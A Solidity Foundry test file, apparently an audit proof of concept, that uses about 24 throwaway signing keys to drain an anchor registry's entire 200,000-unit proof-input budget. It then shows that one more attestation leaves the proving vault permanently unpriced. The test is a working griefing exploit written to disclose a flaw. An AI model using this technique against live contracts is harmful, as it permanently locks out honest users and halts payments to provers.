// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {IEAS} from "@ethereum-attestation-service/eas-contracts/contracts/IEAS.sol";
import {EAS} from "@ethereum-attestation-service/eas-contracts/contracts/EAS.sol";
import {SchemaRegistry} from "@ethereum-attestation-service/eas-contracts/contracts/SchemaRegistry.sol";
import {ISchemaRegistry} from "@ethereum-attestation-service/eas-contracts/contracts/ISchemaRegistry.sol";

import {EasOffchainAnchorRegistry} from "src/registry/EasOffchainAnchorRegistry.sol";
import {ProvingVault} from "src/vault/ProvingVault.sol";
import {IInstanceRegistry} from "interfaces/registry/IInstanceRegistry.sol";
import {IEthUsdFeed} from "interfaces/vault/IEthUsdFeed.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PE_Lane1Mock {
    uint64 public leafCount;
    function setLeafCount(uint64 c) external { leafCount = c; }
}

contract PE_FeedMock {
    function decimals() external pure returns (uint8) { return 8; }
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, int256(3000e8), block.timestamp, block.timestamp, 1);
    }
}

contract PE_SnapshotMock {
    address public accumulator;
    address public anchorRegistry;
    constructor(address a, address r) { accumulator = a; anchorRegistry = r; }
}

/// @notice PoC: envelope-0 lane-2 ingress buys 8,192 units of the shared 200,000 proof-input
///         budget for ONE ~92k-gas transaction, so ~24 free EOAs exhaust an instance's entire
///         lifetime proving capacity. One further permissionless lane-1 EAS attestation then
///         tips the combined count past MAX_PRICED_INPUTS, at which point ProvingVault.bandOf
///         returns the unpriced band 0 forever: no prover is ever paid again, and the operator
///         refuses the work. None of the three counters can ever decrease.
contract PashovEcon_AnchorWorkStarvation is Test {
    bytes32 internal constant SCHEMA_UID = keccak256("strict-envelope-0-schema");

    EAS internal eas;
    EasOffchainAnchorRegistry internal registry;
    PE_Lane1Mock internal lane1;
    address internal admin = address(0xAD11);
    ProvingVault internal vault;

    function setUp() public {
        SchemaRegistry sr = new SchemaRegistry();
        eas = new EAS(ISchemaRegistry(address(sr)));
        lane1 = new PE_Lane1Mock();
        address[] memory relayers = new address[](1);
        relayers[0] = address(this); // the governance-admitted gasless relayer
        registry = new EasOffchainAnchorRegistry(
            IEAS(address(eas)), SCHEMA_UID, 200_000, admin, address(this), relayers
        );
        PE_SnapshotMock snap = new PE_SnapshotMock(address(lane1), address(registry));
        registry.bindSnapshot(address(snap));

        vault = new ProvingVault(
            IInstanceRegistry(address(0xdead)),
            IERC20(address(0xbeef)),
            IEthUsdFeed(address(new PE_FeedMock())),
            1 days,
            100e8,
            100_000e8,
            admin,
            admin
        );
    }

    function _sig(uint256 key, bytes32 nodeId, bytes32 prev, bytes32 head, uint64 count, bytes32 dc)
        internal view returns (bytes memory)
    {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, registry.anchorDigest(nodeId, 0, prev, head, count, dc));
        return abi.encodePacked(r, s, v);
    }

    function test_TwentyFourFreeEoasPermanentlyExhaustTheSharedProofInputBudget() public {
        // A modest, realistic live graph: 4,000 on-chain vouch edges already folded in lane 1.
        lane1.setLeafCount(4_000);

        uint64 cap = registry.maxTotalInputs();
        uint256 gasTotal;
        uint256 nodesUsed;

        for (uint256 i = 1; i <= 40; ++i) {
            uint256 key = 0xBEEF0000 + i;
            address a = vm.addr(key);
            bytes32 nodeId = keccak256(abi.encode(a));

            // Largest count this node can still buy inside the remaining budget.
            uint64 room = cap - lane1.leafCount() - registry.workCount();
            if (room <= 1) break;
            uint64 want = (room - 1) / registry.E0_ENTRY_WORK_UNITS();
            if (want == 0) break;
            if (want > registry.MAX_ENTRIES_PER_NODE()) want = registry.MAX_ENTRIES_PER_NODE();

            bytes32 head = keccak256(abi.encode("head", i));
            bytes32 dc = keccak256(abi.encode("payload", i));
            bytes memory sg = _sig(key, nodeId, bytes32(0), head, want, dc);

            uint256 g0 = gasleft();
            registry.anchor(nodeId, 0, bytes32(0), head, want, dc, sg);
            gasTotal += g0 - gasleft();
            nodesUsed++;
        }

        console2.log("sybil nodes used            :", nodesUsed);
        console2.log("execution gas TOTAL         :", gasTotal);
        console2.log("registry.anchorCount()      :", registry.anchorCount());
        console2.log("aggregate entry count       :", registry.aggregateLatestEnvelope0EntryCount());
        console2.log("registry.workCount()        :", registry.workCount());
        console2.log("lane1 + lane2 work          :", uint256(lane1.leafCount()) + registry.workCount());

        // ~24 transactions consumed the ENTIRE 200,000 lifetime budget.
        assertLe(nodesUsed, 25, "budget drained by fewer than 26 calls");
        assertEq(uint256(lane1.leafCount()) + registry.workCount(), cap, "budget exactly exhausted");

        // Lane-2 ingress is now permanently dead for every honest user.
        uint256 honest = 0xC0FFEE;
        address h = vm.addr(honest);
        bytes32 hNode = keccak256(abi.encode(h));
        bytes32 hHead = keccak256("honest-head");
        bytes32 hDc = keccak256("honest-payload");
        bytes memory hSig = _sig(honest, hNode, bytes32(0), hHead, 1, hDc);
        vm.expectPartialRevert(EasOffchainAnchorRegistry.InputCapacityExceeded.selector);
        registry.anchor(hNode, 0, bytes32(0), hHead, 1, hDc, hSig);

        // At exactly the ceiling the vault still prices the instance (band 3)...
        uint64 work = registry.workCount();
        assertEq(vault.bandOf(keccak256("trust-graph"), lane1.leafCount(), work), 3);

        // ...but lane 1 is permissionless. ONE more EAS attestation (or revoke) folded by
        // EASIndexerResolver takes leafCount to 4,001 and the combined count to 200,001.
        lane1.setLeafCount(4_001);
        assertEq(
            vault.bandOf(keccak256("trust-graph"), lane1.leafCount(), work),
            0,
            "unpriced band: no prover is ever paid for this instance again"
        );
        // Same for every other priced program.
        assertEq(vault.bandOf(keccak256("trust-graph-weighted"), lane1.leafCount(), work), 0);
        assertEq(vault.bandOf(keccak256("contributions"), lane1.leafCount(), work), 0);
        assertEq(vault.bandOf(keccak256("hypercerts"), lane1.leafCount(), work), 0);
    }
}
